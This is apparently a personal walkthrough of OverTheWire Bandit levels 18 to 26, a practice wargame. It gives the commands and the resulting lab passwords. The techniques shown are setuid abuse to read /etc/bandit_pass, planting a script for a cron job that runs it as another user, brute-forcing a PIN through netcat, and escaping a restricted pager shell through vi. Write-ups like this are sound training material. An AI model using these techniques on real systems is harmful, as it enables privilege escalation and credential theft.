### Bandit18 -> Level19

* Task

The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.

* This exits with bye message and closes the ssh connection.
* We can run commands while at the same time connecting through ssh on the host.
* So i first connect to the host through ssh and list the files in the directory.

```
root@kali:~# ssh bandit18@bandit.labs.overthewire.org -p 2220 ls -la
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit18@bandit.labs.overthewire.org's password: 
total 24
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 .
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ..
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r-----  1 bandit19 bandit18 3794 Dec 28 14:34 .bashrc
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-rw-r-----  1 bandit19 bandit18   33 Dec 28 14:34 readme
```
* We can see a readme file in the home directory
* i cat the file. 

```
root@kali:~# ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit18@bandit.labs.overthewire.org's password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

```

* The password.

```
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

---

### Bandit19 -> Level20

* Task
To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.

* This task had file which had evalated permission. There is a stickybit.

```
bandit19@bandit:~$ ls -la
total 28
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 .
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ..
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-rwsr-x---  1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-do
```
* setuid stands for set user ID on execution. This allows users to run certain programs with escalated privileges in this case bandit19.

* I this situation i executed the program bandit20-do whilst displaying the contents of /etc/bandit_pass/bandit20.

```
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

* This gave me the password for the next level.


---

### Bandit20 -> Level21

* Task
There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

* The most important tool in this task was netcat.
* So it is important to read the man pages on this tool.

* I first created a listener with netcat.On port 6969.

```
bandit20@bandit:~$ nc -lv 6969
```

* -l option is to listen on a port.
* -v option is for verbose.

* I then open up another terminal where i executed the program suconnect. On port 6969.

```
bandit20@bandit:~$ ./suconnect 6969
```

* I pasted in the password from the previous level.

```
bandit20@bandit:~$ ./suconnect 6969
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
```
* Recieved a password matches.
* Went back to my other terminal where the listener is running.

```
bandit20@bandit:~$ nc -lvp 6969
Listening on [0.0.0.0] (family 0, port 6969)
Connection from [127.0.0.1] port 6969 [tcp/*] accepted (family 2, sport 54132)
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

* As you can see it echoed back the password for the next level.


---

### Bandit21 -> Level22

* Task

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

* First step i took was to look into the /etc/cron.d/ directory.

```
bandit21@bandit:~$ cd /etc/cron.d
```

* List the files in the directory.

```
bandit21@bandit:/etc/cron.d$ ls -la
total 28
drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
-rw-r--r--   1 root root  190 Oct 31  2017 popularity-contest
```

* The cronjob_bandit22 file look interesting. So i looked into the contents for the file.

```
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

* So it looks like a shell script is run every minute.
* I searched for the file and look into the contents.

```
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
* From here we can see a the password for the next level is redirected to the /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv. 

* I displayed the contents of this file.

```
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

* This gave me the password for the next level.


---

### Bandit22 -> Level23

* Task

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

* Again there is a program runnning automatically in the /etc/cron.d.
* So i looked into the directory.

```
bandit22@bandit:~$ cd /etc/cron.d/
bandit22@bandit:/etc/cron.d$ ls -la
total 28
drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
-rw-r--r--   1 root root  190 Oct 31  2017 popularity-contest
```

* There is a cronjob_bandit23.
* I displayed the contents of the file.

```
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

* From this bash script. It looks like myname variable holds the current username, which in this case is bandit23.
* Then another variable mytarget, prints a message I am user bandit23.
* This message is hash with a md5sum.
* Then the first field is trimmed with cut.
* Finally the contents of the password in the /etc/bandit_pass/bandit23 is redirected to /tmp/$mytarget . mytarget being the variable.

```
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
```
* Dispay the hash. This is the file in tmp directory.

```
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

* I recieve the password for the next level.

---

### Bandit23 -> Level24

* Task

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

* I first looked inside the /etc/cron.d/ directory to see the cronjob that is running for bandit24.

```
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -la
total 28
drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
-rw-r--r--   1 root root  190 Oct 31  2017 popularity-contest
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

* Just like the previous level there is a shell script that is running every minute in /usr/bin/cronjob_bandit24.sh directory.
* I cat the file in this directory to see the shell script.

```
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
```

* From this bash script we can see that the following occurs;

1. The user is placed a variable called myname.
2. Change directory to /var/spool/$myname.
3. Display a message ,executing and deleting all scripts in the /var/spool/$myname.
4. Loop through all files in the current directory.
	4.1. Check if the file in not equal to . file or the previous directory.
		4.1.1. Then display message handling filename.
		4.1.2. execute all files in the directory with timeout after 1 minute kill all files with SIGKILL signal.
		4.1.3. remove all files in this directory.
	4.2. end if statement.
5. End script.

* What we can do here is create a directory that is writeable by all users.
* Then inside of this directory create a bash script which copies the password from /etc/bandit_pass/bandit24 into a file.
* We make the bash script executable by all users.
* Then copy this bash script inside the /var/spool/bandit24 directory, where it will be run by the bandit24 user.
* Which we will recieve the password when the cronjob is executed.

1. Create the directory.

```
bandit23@bandit:/etc/cron.d$ mkdir -p /tmp/bandit-password/
```

2. Make the directory writeable to all users.

```
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/bandit-password/
```

3. Create a bash script inside this directory which copies the password from /etc/bandit_pass/bandit24 to a file in this directory.

```
bandit23@bandit:/tmp/bandit-password$ touch bandit24pass.sh
bandit23@bandit:/tmp/bandit-password$ vim bandit24pass.sh 
```

```
#!/bin/bash

#cat the file of bandit24 password to new file in this directory.

cat /etc/bandit_pass/bandit24 > /tmp/bandit-password/bandit24-pass
```

4. Makes the file executable by all users.

```
bandit23@bandit:/tmp/bandit-password$ chmod 777 bandit24pass.sh 
```

5. Now copy the bash script to the /var/spool/bandit24 where it will be executed by bandit24 user.

```
bandit23@bandit:/tmp/bandit-password$ cp bandit24pass.sh /var/spool/bandit24/
```

6. Now we wait till the cronjob is excuted again so we can recieve our password.

```
bandit23@bandit:/tmp/bandit-password$ ls
bandit24-pass  bandit24pass.sh
```

7. Bash script has been executed and we receive our password.

```
bandit23@bandit:/tmp/bandit-password$ cat bandit24-pass 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```


---

### Bandit24 -> Level25

* Task

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


* In this level i had to create a script which would first have the password for the current level and four digit number.
* I first create a new directory to work in.

```
bandit24@bandit: mkdir -p /tmp/bruteforcer
```

* I then create a script that will iterated over 0000 - 9999 for the pin and give the password, with space separating them.

```
#!/bin/bash

for i in {0000..9999}; 
do  
	echo -n $(cat /etc/bandit_pass/bandit24) && echo -n " " && echo $i
done
```

* At each iteration the following occurs;

1. the password is displayed
2. space is created.
3. display the four digit pin.

* I then pipe the script to netcat so i can recieve the password for the next level.

```
bandit24@bandit:/tmp/bruteforcer$./bandit24bruteforcer.sh|nc localhost 30002

```

* Output


```

Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```


---

### Bandit 25 -> Level26

* Task

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

* I checked the files in the home directory. 

```
bandit25@bandit:~$ ls -la
total 32
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 .
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ..
-rw-r-----  1 bandit25 bandit25   33 Dec 28 14:34 .bandit24.password
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-rw-r-----  1 bandit25 bandit25    4 Dec 28 14:34 .pin
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-r--------  1 bandit25 bandit25 1679 Dec 28 14:34 bandit26.sshkey
```

* From there i notice there is a private ssh key for bandit26.
* I try and login into bandit26 user with this key.

```

bandit25@bandit:~$ ssh -i bandit26.sshkey -t bandit26@localhost
```

* Immediately when i login the banner shows up, but the connection is closed.
* The tasks does say the that /bin/bash is not in the shell used on bandit26 account.
* So i try and find out what shell is being used.
* I can do this by checking the /etc/passwd file to see what shell bandit26 is using.

```
bandit25@bandit:~$ cat /etc/passwd
```

* The shell is;

```
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```
* So i looked into the file to see its contents.

```
bandit25@bandit:~$ cat /usr/bin/showtext 
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

* From this file it seems like the banner is displayed with more.
* I quickly check man page for more.

```
bandit25@bandit:~$ man more
```

* Here what i could do is minimize the screen to force more command.
* From the man pages, i found out you can enter vi mode with v command.
* Then we can edit the contents of /etc/bandit_pass/bandit26 with e command in vi.

1. First minimize the terminal and ssh into the bandit26.

```
bandit25@bandit:~$ ssh -i bandit26.sshkey -t bandit26@localhost 
```

2. Then we enter more, we can now enter vi mode with v command.

3. Now we can edit the /etc/bandit_pass/bandit26 file with :e command

```
:e /etc/bandit_pass/bandit26
```

4. This will then give us the password for bandit26.

```
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```


* This was the end of overthewire bandit. Fun challenges and great way to learn bash and some bash scripting.


